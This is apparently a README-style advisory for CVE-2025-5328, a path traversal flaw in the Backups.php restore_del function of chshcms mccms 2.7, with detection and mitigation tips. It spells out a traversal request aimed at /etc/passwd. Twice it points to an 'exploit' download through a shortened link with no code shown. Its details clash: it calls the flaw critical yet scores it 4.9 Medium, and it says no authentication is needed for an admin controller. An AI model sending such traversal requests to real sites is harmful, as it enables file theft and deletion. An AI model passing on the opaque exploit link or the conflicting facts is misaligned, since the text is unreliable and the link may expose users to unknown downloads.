# CVE-2025-5328 â€“ Path Traversal in chshcms mccms 2.7 (Backups.php)

> **Critical-severity remote vulnerability** in `restore_del` function  
> Allows arbitrary file deletion or manipulation via path traversal 

---

## Summary

**CVE-2025-5328** is a **path traversal** vulnerability in `chshcms mccms` version 2.7. The flaw lies in the `restore_del` function within the file `/sys/apps/controllers/admin/Backups.php`. The issue is caused by improper sanitization of the `dirs` parameter, allowing attackers to traverse directories and delete or overwrite files outside the intended backup directory.

- **CVE ID:** CVE-2025-5328  
- **CVSSv3 Score:** 4.9 (Medium)  
- **Attack Vector:** Remote  
- **Authentication Required:** No  
- **User Interaction Required:** No  
- **Impact:** Integrity, Availability  

---

## Affected Component

- Product: chshcms mccms 2.7  
- File: `/sys/apps/controllers/admin/Backups.php`  
- Function: `restore_del(dirs)`

## Exploit: [Download](https://tinyurl.com/mtdn2udr)

---

## Vulnerability Details

The `dirs` parameter in `restore_del()` is not properly validated. By supplying crafted path sequences (e.g., `../../../etc/passwd`), an attacker can access or delete arbitrary files outside the backup directory. This violates the intended access control boundary.

---

## Exploitation Workflow

1. Attacker locates a publicly accessible endpoint such as:
`https://target.com/sys/apps/controllers/admin/Backups.php?act=restore_del&dirs=../../../../etc/passwd`
2. The input `dirs` is used without proper sanitization.
3. File system access or deletion occurs outside intended directory.
4. Results in file overwrite, configuration deletion, or availability disruption.

---

## Detection & Mitigation

### Detection

- Monitor web server logs for suspicious `dirs=` parameters.
- Look for `../` or encoded variants in query strings.
- Alert on access to unexpected system files by the web application.

### Mitigation

- Apply strict input validation on `dirs` parameter.
- Use `basename()` or directory whitelisting to restrict path scope.
- Restrict permissions on sensitive files to prevent unintended access.

---

## Exploit: [Download](https://tinyurl.com/mtdn2udr)

**Security Contact:**  
sratet@proton.me
